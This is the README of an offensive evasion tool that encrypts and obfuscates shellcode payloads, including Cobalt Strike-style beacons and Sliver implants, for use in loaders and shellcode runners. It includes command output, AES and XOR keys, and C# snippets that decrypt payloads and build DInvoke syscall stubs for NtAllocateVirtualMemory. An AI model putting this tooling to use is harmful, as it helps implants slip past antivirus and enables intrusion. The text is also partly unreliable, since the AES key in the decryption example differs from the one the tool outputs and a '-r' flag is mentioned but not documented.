# LikesEvasion

Various obfuscation and decryption functionality for loaders, droppers, runners.

## Usage

```
LikesEvasion 1.0.0.2
Copyright c  2022

  -i, --input     Required. Input file to be processed (e.g. beacon.bin)

  -m, --mode      Required. Encryption/encoding mode (aesCs,caesarCs,caesarVba,xorCs,xorCsString,gzip,ungzip)

  -o, --output    Output filename

  --help          Display this help screen.

  --version       Display version information.
```

## Examples

### C# AES Bin Payload

The following example encrypts the bin file using AES and stores the output in a text file. The text file can be added as a resource to a runner. Remove the `-r` flag to output the encrypted blob to the console for copy and paste. 

```
PS> .\LikesEvasion.exe -m aescs -i .\calc.bin -o .\calc.bin.aes
[>] Initializing...
[>] Mode: aescs
[>] Input mode: bin
[>] Reading bytes from: .\calc.bin
[>] Bytes read: 276
[>] Storing buffer in .\calc.bin.aes
[>] Writing output file
[>] Copy & paste into shellcode runner
-----
byte[] buf = loadResource(...);

byte[] iv = new byte[16] {0x30, 0xb1, 0xfb, 0x8a, 0xf8, 0xf5, 0x22, 0x41, 0x6a, 0xf1, 0xeb, 0xda, 0x29, 0xd7, 0x98, 0xb5};
byte[] key = new byte[32] {0x7b, 0xf7, 0xb3, 0x83, 0xb0, 0x07, 0x56, 0x44, 0xac, 0xfa, 0x56, 0x0a, 0x83, 0xd2, 0xfe, 0x88, 0x86, 0x95, 0x28, 0x4a, 0x27, 0xea, 0x07, 0xf3, 0x6b, 0x07, 0x1f, 0xda, 0xa6, 0x6b, 0x98, 0x46};
-----
[>] Thanks to @xct_de
```

An example decryption routine can be found in the [DecryptAesCsharpBytes.cs](./LikesEvasion/Templates/DecryptAesCsharpBytes.cs) template. Copy the `iv` and `key` strings into the runner and decrypt:

```
static void Main(string[] args)
{
    [...]
    byte[] iv = new byte[16] { 0x30, 0xb1, 0xfb, 0x8a, 0xf8, 0xf5, 0x22, 0x41, 0x6a, 0xf1, 0xeb, 0xda, 0x29, 0xd7, 0x98, 0xb5 };
    byte[] key = new byte[32] { 0xe6, 0xd6, 0x69, 0x4e, 0x5b, 0x01, 0xd2, 0xb0, 0xf8, 0x43, 0xe0, 0x3f, 0xd9, 0xc8, 0x6f, 0x9c, 0x2a, 0x04, 0x50, 0x42, 0x65, 0x3b, 0xdb, 0xcb, 0x12, 0x92, 0xd8, 0xa6, 0x0a, 0x0d, 0x2d, 0x44 };

    byte[] buf = Decrypt(encrypted, key, iv);
    [...]
}
```

### C# XOR String

Perform string obfuscation:

```
PS> .\LikesEvasion.exe -m xorCsString -i NtAllocateVirtualMemory
[>] Initializing...
[>] Mode: xorCsString
[>] Input mode: string
[>] Encrypting string: NtAllocateVirtualMemory
[>] encrypting 1 entries
[>] key: 0x45, 0x59, 0x54, 0x38, 0x4a, 0x64, 0x71, 0x57, 0x57, 0x70, 0x4a, 0x70, 0x49, 0x47, 0x43, 0x52, 0x31, 0x34, 0x33, 0x46, 0x77, 0x6a, 0x45, 0x41, 0x63, 0x58, 0x47, 0x4c
[>] exec stub:

//  NtAllocateVirtualMemory
LikesEvasion.Evade.Deflate(LikesEvasion.Evade.FromHex("0b2d1554260b123623151c193b3336335d79562b18183c"),LikesEvasion.Evade.FromHex("455954384a64715757704a704947435231343346776a45416358474c"));
```

Next, add the decryption routine to a program. An example decryption routine can be found in the [DecryptXorCsharpString.cs](./LikesEvasion/Templates/DecryptXorCsharpString.cs) template. Example decryption:

```
static void Main(string[] args)
{
    Console.WriteLine(LikesEvasion.Evade.Deflate(LikesEvasion.Evade.FromHex("0b2d1554260b123623151c193b3336335d79562b18183c"), LikesEvasion.Evade.FromHex("455954384a64715757704a704947435231343346776a45416358474c")));
    
}
```

PoC output:

```
PS> .\PocXorStub.exe
NtAllocateVirtualMemory
```

Usage with DInvoke example:

```
static void Main(string[] args)
{
    [...]
    IntPtr syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub(LikesEvasion.Evade.Deflate(LikesEvasion.Evade.FromHex("0b2d1554260b123623151c193b3336335d79562b18183c"), LikesEvasion.Evade.FromHex("455954384a64715757704a704947435231343346776a45416358474c")));
    DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory syscallAllocateVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory));
    [...]
}
```

### Gzip bin

Use the `gzip` mode to compress a bin. In the following example, the 11 MB sliver bin is reduced to 4 MB. 

```
PS> .\LikesEvasion.exe -m gzip -i .\SLIVER.bin -o .\SLIVER.bin.gzip
[>] Initializing...
[>] Mode: gzip
[>] Input mode: bin
[>] Reading bytes from: .\SLIVER.bin
[>] Bytes read: 10878164
[>] Storing buffer in .\SLIVER.bin.gzip
[>] Compressing buffer
[>] Compressed size: 3897189
[>] Writing output file
```